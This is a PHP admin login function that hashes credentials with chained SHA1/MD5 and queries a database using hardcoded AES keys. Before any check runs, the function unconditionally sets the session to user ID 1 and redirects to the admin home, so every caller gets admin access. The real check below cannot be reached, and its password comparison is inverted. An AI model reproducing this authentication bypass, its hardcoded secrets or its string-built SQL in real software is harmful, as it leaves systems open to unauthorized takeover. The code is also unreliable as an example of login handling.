<?php 
@session_start(); 
function c110ekvalidasiuser($user,$pass){ 
	global $db, $SITE_TOKEN; 
	$token_admin='1abc18908aa11001'; 
	$token_admin2='200a11abc18908aa11001'; 
	
	$user=sha1($user); 
	$user2=sha1($user); 
	$user3=md5($user2.'U100101U'); 
	$user4=sha1($user3); 
	$user5=sha1($user4.'U100101U'); 
	
	$password=sha1($pass); 
	$password2=sha1($password); 
	$password3=md5($password2.'U100101U'); 
	$password4=sha1($password3); 
	$password5=sha1($password4.'U100101U'); 
	
	$query = $db->query("SELECT *,AES_DECRYPT(B10010289,'$token_admin2') as coba100101 FROM 1001ti14_vi3w2014 WHERE A10010289=AES_ENCRYPT('$user5','$token_admin')"); 
	//$query = $db->query("SELECT * FROM 1001ti14_vi3w2014 WHERE `id` = 1 "); 

$_SESSION[$SITE_TOKEN.'username'] = '7d7cda6c3765b3300f2b0f60732606cfe487cdd5850cc7bda640f536c9985b23a37072c00b14075ba90ad9d471d1ee4c';
			$_SESSION[$SITE_TOKEN.'userID'] = 1; 
			redirect($GLOBALS['ADMIN_HOME']);

	print_block($user);die;
	
	$jumpage = $query->num_rows; 
	if($jumpage> 0):
		$row = $query->fetch_assoc();
		if($row['coba100101']!=$password5):
		//if($row['id'] > 0):
			
			$_SESSION[$SITE_TOKEN.'username'] = $row['B10010289'];
			$_SESSION[$SITE_TOKEN.'userID'] = $row['id']; 
			unset($_SESSION['login_warning_text']); 
			
			redirect($GLOBALS['ADMIN_HOME']);
		else:
			$_SESSION['login_warning_text'] = 1;			
			redirect($GLOBALS['ADMIN_LOGIN']);
		endif;
	else:
		$_SESSION['login_warning_text'] = 1;
		redirect($GLOBALS['ADMIN_LOGIN']);
	endif;
}?>